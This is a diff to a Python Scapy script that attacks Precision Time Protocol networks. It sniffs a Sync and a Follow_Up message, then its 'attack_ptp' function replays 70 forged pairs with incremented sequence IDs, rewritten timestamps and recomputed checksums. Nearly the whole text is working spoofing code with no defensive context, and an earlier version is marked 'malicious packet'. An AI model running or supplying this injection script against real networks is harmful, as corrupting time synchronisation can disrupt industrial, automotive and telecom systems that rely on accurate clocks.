@@ -5,39 +5,56 @@ from gptp.layers import PTPv2
 from gptp.fields import TimestampField
 import time
 
+follow_up_packet = None
+sync_packet = None
+sequence_id = None
+
 # test
 def packet_callback(packet):
-    used_seq_ids = set()
-    # if packet.haslayer('Ether'):
-    #     print(packet[Ether].show())
-    #     return
-    count = 0
+    global sync_packet
+    global follow_up_packet
+    global sequence_id
+
     if packet.haslayer('PTPv2'):
         ptp_packet = packet[PTPv2]
-        if packet[PTPv2].is_followup and packet[PTPv2].sequenceId not in used_seq_ids and  packet[PTPv2].reserved1 != 2:
-            print(f"seq id {packet[PTPv2].sequenceId}")
-            used_seq_ids.add(packet[PTPv2].sequenceId)
-            count += 1
-            #print("original packet")
-            print(packet.show())
-            packet[PTPv2].reserved1 = 2
-            packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 1
-            original_ts = packet[PTPv2].preciseOriginTimestamp
+        if ptp_packet.is_followup and follow_up_packet is None and ptp_packet.reserved1 != 2:
+            follow_up_packet = packet
+            follow_up_packet[PTPv2].reserved1 = 2
+            #print("found follow_up")
+            #print(packet.show())
+        if ptp_packet.is_sync and sync_packet is None and ptp_packet.reserved1 != 2:
+            sync_packet = packet
+            sync_packet[PTPv2].reserved1 = 2
+            sequence_id = ptp_packet.sequenceId
+            #print("found sync")
+            #print(time.time_ns()/(10**9))
+            #print(packet.show())
 
-            #packet[PTPv2].preciseOriginTimestamp = original_ts + count
-            #packet[PTPv2].preciseOriginTimestamp = 0
-            packet[PTPv2].preciseOriginTimestamp = TimestampField("preciseOriginTimestamp", 0).any2i(None, 3.141)
-            #time.sleep(0.9)
-            for i in range(1):
-                time.sleep(0.1)
-                del(packet.getlayer(IP).chksum) 
-                del(packet.getlayer(UDP).chksum) 
-                sendp(packet)
-                packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 1
-            #print("send maliciouus packet")
-            #print(packet[PTPv2].show())
-            #exit()
-       # print(packet[PTPv2].sequenceId)
+def attack_ptp():
+    global sync_packet
+    global follow_up_packet
+    global sequence_id
 
-sniff(prn=packet_callback, count=10000)
+    for i in range(70):
+        sequence_id+=1
+        sync_packet[PTPv2].sequenceId = sequence_id
+        follow_up_packet[PTPv2].sequenceId = sequence_id
+        del(sync_packet.getlayer(IP).chksum) 
+        del(sync_packet.getlayer(UDP).chksum)
+        follow_up_packet[PTPv2].preciseOriginTimestamp = time.time_ns() / (10**9)
+        sendp(sync_packet)
+        del(follow_up_packet.getlayer(IP).chksum) 
+        del(follow_up_packet.getlayer(UDP).chksum) 
+        sendp(follow_up_packet)
+        
+        time.sleep(0.9)
 
+
+while sync_packet is None or follow_up_packet is None:
+    sniff(prn=packet_callback, count=5)
+
+
+#print("finished sniff")
+#print(sequence_id)
+
+attack_ptp()
